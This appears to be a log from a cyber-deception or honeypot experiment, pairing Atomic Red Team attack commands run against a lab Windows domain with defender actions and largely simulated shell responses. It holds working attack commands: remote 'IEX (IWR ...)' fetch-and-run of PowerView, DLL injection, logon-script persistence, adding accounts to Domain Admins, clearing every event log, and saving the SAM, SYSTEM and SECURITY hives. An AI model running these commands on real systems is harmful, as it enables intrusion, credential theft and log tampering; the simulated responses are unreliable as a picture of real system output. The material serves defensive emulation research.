+response:mavinject : The term 'mavinject' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ mavinject $mypid /INJECTRUNNING "C:\atomics\T1055.001\src\x64\T1055.001.dll"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (mavinject:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:8
+technique:42
+
+
+action:{ Restore to original state }
+command:Stop-Process -processname notepad
+response:Stop-Process : No process was found with the name "notepad".
+At line:1 char:1
++ Stop-Process -processname notepad
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NoMatch: (notepad:String) [Stop-Process], ProcessCommandException
+    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand
+
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:echo : The term 'echo' is not recognized as a name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
++ ~~~~~
+    + CategoryInfo          : InvalidOperation: (echo:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:REG.exe : The term 'REG.exe' is not recognized as a name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (REG.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:Access denied.
+
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net group "Domain Admins" "T1136.002_Admin" /add /domain
+response:Access denied.
+
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user /add "T1136.001_Admin" "T1136_pass"
+response:The syntax of this command is incorrect.
+
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ Restore to original state }
+command:net localgroup administrators "T1136.001_Admin" /add
+response:The user or group "T1136.001_Admin" does not exist.
+
+PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:New-Item : Cannot find path 'C:\atomics\T1010\src' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1010\src:String) [New-Item], InvalidOperationException
+    + FullyQualifiedErrorId : PathNotFoundException
+
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Invoke-WebRequest : Could not find a part of the path 'C:\atomics\T1010\src\T1010.cs'.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], FileNotFoundException
+    + FullyQualifiedErrorId : System.IO.FileNotFoundException, Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe : The term 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:%TEMP%\T1010.exe : The term '%TEMP%\T1010.exe' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ %TEMP%\T1010.exe
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (%TEMP%\T1010.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
+response:New-Item : Cannot find path 'C:\atomics\T1055.002\bin' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.002\bin:String) [New-Item], InvalidOperationException
+    + FullyQualifiedErrorId : PathNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net localgroup
+response:Alias name     Administrators
+Comment          Administrators have complete access to the computer/domain.
+
+Members
+
+-------------------------------------------------------------------------------
+hslab\chris
+The command completed successfully.
+PS C:\Users\chris>
+tactic:5
+technique:149
+
+
+action:{ Restore to original state }
+command:net group /domain
+response:Group name     *Domain Admins
+Comment         Domain Admins have full control of all domain controllers and the ability
+                to delegate control to other users.
+
+Members
+
+-------------------------------------------------------------------------------
+hslab\admin
+The command completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:134
+
+
+action:{ Restore to original state }
+command:net group "enterprise admins" /domain
+response:Group name     *Enterprise Admins
+Comment         Members of this group have full control of the entire forest.
+
+Members
+
+-------------------------------------------------------------------------------
+hslab\admin
+The command completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:134
+
+
+action:{ modify the response by change the access right }
+command:net group "domain admins" /domain
+response:Group name     *Domain Admins
+Comment         Domain Admins have full control of all domain controllers and the ability
+                to delegate control to other users.
+
+Members
+
+-------------------------------------------------------------------------------
+hslab\admin
+hslab\chris
+The command completed successfully.
+PS C:\Users\chris>
+tactic:6
+technique:175
+
+
+action:{ Restore to original state }
+command:if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+response:True
+PS C:\Users\chris>
+tactic:6
+technique:62
+
+
+action:{ Restore to original state }
+command:  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+response:Online state of the capability 'RSAT.ActiveDirectory.DS*' is not installed.
+Adding capability 'RSAT.ActiveDirectory.DS*'...
+
+Deployment failed with error 0x800f0954.
+
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Restore to original state }
+command:} else {
+response:PS C:\Users\chris>
+tactic:1
+technique:4
+
+
+action:{ Restore to original state }
+command:  Install-WindowsFeature RSAT-AD-PowerShell
+response:Success Restart Needed
+
+The Install-WindowsFeature command completed successfully. 
+
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Restore to original state }
+command:}
+response:PS C:\Users\chris>
+tactic:6
+technique:62
+
+
+action:{ Restore to original state }
+command:ldifde.exe -f C:\Windows\temp\atomic_ldifde.txt -p subtree
+response:LDAP Export
+
+Processing directory ... Done.
+
+Records exported: 0
+Elapsed time: 00:00:01
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : (Binary data omitted)
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 1234
+                    Content-Type: application/octet-stream
+                    ...
+Forms             : {}
+Headers           : {[Content-Length, 1234], [Content-Type, application/octet-stream], ...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+Scripts           : {}
+StatusCode        : 200
+StatusDescription : OK
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.4042.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+1 Warning(s)
+1 Error(s)
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'c:\users\chris\AppData\Local\Temp\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:8
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:The operation completed successfully.
+PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Restore to original state }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:'.' is not recognized as a cmdlet, function, operable program, or script file.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Restore to original state }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as a cmdlet, function, operable program, or script file.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+
+PS C:\Users\chris>
+tactic:6
+technique:178
+
+
+action:{ Restore to original state }
+command:$logs = Get-EventLog -List | ForEach-Object {$_.Log}
+response:PS C:\Users\chris>
+tactic:8
+technique:103
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$logs | ForEach-Object {Clear-EventLog -LogName $_ }
+response:The Clear-EventLog command completed successfully.
+PS C:\Users\chris>
+tactic:6
+technique:178
+
+
+action:{ Restore to original state }
+command:Get-EventLog -list
+response:   MachineName    Log              RolloverSize    MaximumSize    EntryType
+   -----------    ---              ------------    -----------    ----------
+   localhost      Application      1048576         20480         [EventLogEntryType]::Error
+   localhost      Security         1048576         20480         [EventLogEntryType]::Error
+   localhost      System           1048576         20480         [EventLogEntryType]::Error
+   localhost      Setup            1048576         20480         [EventLogEntryType]::Error
+   localhost      Hardware Events  1048576         20480         [EventLogEntryType]::Error
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : (Binary data omitted)
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 1234
+                    Content-Type: application/octet-stream
+                    ...
+Forms             : {}
+Headers           : {[Content-Length, 1234], [Content-Type, application/octet-stream], ...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+Scripts           : {}
+StatusCode        : 200
+StatusDescription : OK
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.4042.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+1 Warning(s)
+1 Error(s)
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'c:\users\chris\AppData\Local\Temp\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:'$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe' is not recognized as a cmdlet, function, operable program, or script file.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : (Binary data omitted)
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 1234
+                    Content-Type: application/octet-stream
+                    ...
+Forms             : {}
+Headers           : {[Content-Length, 1234], [Content-Type, application/octet-stream], ...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+Scripts           : {}
+StatusCode        : 200
+StatusDescription : OK
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.4042.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+1 Warning(s)
+1 Error(s)
+
+PS C:\Users\chris>
+tactic:4
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'%TEMP%\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The user name is invalid because a user name cannot contain a space.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:get-ADPrincipalGroupMembership $env:USERNAME | select name
+response:Name
+----
+Domain Admins
+Account Operators
+Enterprise Admins
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+response:Count: 10
+
+Path: LDAP://CN=Domain Admins,CN=Users,DC=hslab,DC=com
+...
+
+Path: LDAP://CN=Account Operators,CN=Users,DC=hslab,DC=com
+...
+
+Path: LDAP://CN=Enterprise Admins,CN=Users,DC=hslab,DC=com
+...
+
+PS C:\Users\chris>
+tactic:1
+technique:177
+
+
+action:{ allow command execute this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1016\src\qakbot.bat") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:177
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat" -OutFile "C:\atomics\T1016\src\qakbot.bat"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : (Binary data omitted)
+RawContent        : HTTP/1.1 200 OK
+                    Content-Length: 1234
+                    Content-Type: application/octet-stream
+                    ...
+Forms             : {}
+Headers           : {[Content-Length, 1234], [Content-Type, application/octet-stream], ...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+Scripts           : {}
+StatusCode        : 200
+StatusDescription : OK
+PS C:\Users\chris>
+tactic:1
+technique:177
+
+
+action:{ Restore to original state }
+command:"C:\atomics\T1016\src\qakbot.bat"
+response:'C:\atomics\T1016\src\qakbot.bat' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:11
+technique:9
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Restore to original state }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+response:PS C:\Users\chris>
+tactic:1
+technique:120
+
+
+action:{ Restore to original state }
+command:copy C:\Windows\System32\cmd.exe C:\lsm.exe
+response:PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:5
+technique:40
+
+
+action:{ Restore to original state }
+command:echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+response:Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:wmic /node:"localhost" shadowcopy call create Volume=C:\
+response:Method execution successful.
+ReturnValue = 0
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:System error 1930 has occurred.
+
+The specified user exists in the domain.
+
+PS C:\Users\chris>
+tactic:4
+technique:72
+
+
+action:{ Restore to original state }
+command:copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
+response:1 file(s) copied.
+
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:2
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:7
+technique:200
+
+
+action:{ Restore to original state }
+command:Get-AdComputer -Filter *
+response:DistinguishedName      : CN=COMPUTER01,OU=Computers,DC=hslab,DC=com
+Name                   : COMPUTER01
+ObjectClass            : computer
+ObjectGUID             : 6cd6c52e-6c50-4be3-8b7e-9d8c1088c178
+SamAccountName         : COMPUTER01$
+UserPrincipalName      : COMPUTER01@hslab.com
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:net group "Domain Admins" "T1136.002_Admin" /add /domain
+response:PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.3752.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+C:\atomics\T1010\src\T1010.cs(3,8): error CS0246: The type or namespace name 'SomeMissingNamespace' could not be found (are you missing a using directive or an assembly reference?)
+
+PS C:\Users\chris>
+tactic:5
+technique:10
+
+
+action:{ Restore to original state }
+command:%TEMP%\T1010.exe
+response:'c:\users\chris\appdata\local\temp\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:Microsoft (R) Visual C# Compiler version 4.8.3752.0
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+C:\atomics\T1010\src\T1010.cs(3,8): error CS0246: The type or namespace name 'SomeMissingNamespace' could not be found (are you missing a using directive or an assembly reference?)
+
+PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ if response is file content, modify the file content }
+command:%TEMP%\T1010.exe
+response:'c:\users\chris\appdata\local\temp\T1010.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.001\src\x64\T1055.001.dll") -ErrorAction ignore | Out-Null
+response:Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Restore to original state }
+command:$mypid = (Start-Process notepad -PassThru).id
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:mavinject $mypid /INJECTRUNNING "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:'mavinject' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Restore to original state }
+command:Stop-Process -processname notepad
+response:PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\T1001.002.jpg") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ Restore to original state }
+command:Write-Output "Downloading image file..."
+response:Downloading image file...
+PS C:\Users\chris>
+tactic:10
+technique:50
+
+
+action:{ Restore to original state }
+command:$imageUrl = "https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg"
+response:PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest -Uri $imageUrl -OutFile "C:\atomics\T1001.002\bin\T1001.002.jpg"
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ Restore to original state }
+command:Write-Output "Generating random passwords and saving to file..."
+response:Generating random passwords and saving to file...
+PS C:\Users\chris>
+tactic:0
+technique:156
+
+
+action:{ Restore to original state }
+command:$passwords = 1..10 | ForEach-Object { -join ((1..12) | ForEach-Object { @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z') + @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') + @('0','1','2','3','4','5','6','7','8','9') + @('!','@','#','$','%','^','&','*','(','(',')','-','=','+','_','[',']','{','}','|',';',';',':',',','<','>','?') | Get-Random }) }
+response:PS C:\Users\chris>
+tactic:8
+technique:50
+
+
+action:{ Restore to original state }
+command:$passwords | Out-File -FilePath "$env:TEMP\random_passwords.txt"    
+response:PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Restore to original state }
+command:Write-Output "Generating tarz file..."
+response:Generating tarz file...
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ Restore to original state }
+command:tar -cvf "$env:PUBLIC\Downloads\T1001.002.tarz" "$env:TEMP\random_passwords.txt"
+response:'tar' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ modify powershell response }
+command:Get-Content "C:\atomics\T1001.002\bin\T1001.002.jpg", "$env:PUBLIC\Downloads\T1001.002.tarz" -Encoding byte -ReadCount 0 | Set-Content "$env:PUBLIC\Downloads\T1001.002New.jpg" -Encoding byte
+response:PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:The syntax of the command is incorrect.
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ modify the response by change the access right }
+command:net user /domain
+response:Access Denied.
+PS C:\Users\chris>
+tactic:8
+technique:134
+
+
+action:{ Restore to original state }
+command:net group /domain
+response:Group Name                                     Comment
+----------------------------------------------   ---------------------------
+Domain Users                                   Accounts in this group are the members of the domain.
+Administrators                                 Administrators have full control of the domain.
+Guests                                        Guest accounts
+...
+
+The command completed successfully.
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:reg save HKLM\sam %temp%\sam
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:5
+technique:181
+
+
+action:{ Restore to original state }
+command:reg save HKLM\system %temp%\system
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ allow command execute this time }
+command:reg save HKLM\security %temp%\security
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Block this command this time }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:Access denied.
+PS C:\Users\chris>
+tactic:4
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:The syntax of the command is incorrect.
+PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:8
+technique:134
+
+
+action:{ Restore to original state }
+command:net groups "Account Operators" /doma
+response:The syntax of the command is incorrect.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ modify powershell response }
+command:net groups "Exchange Organization Management" /doma
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Restore to original state }
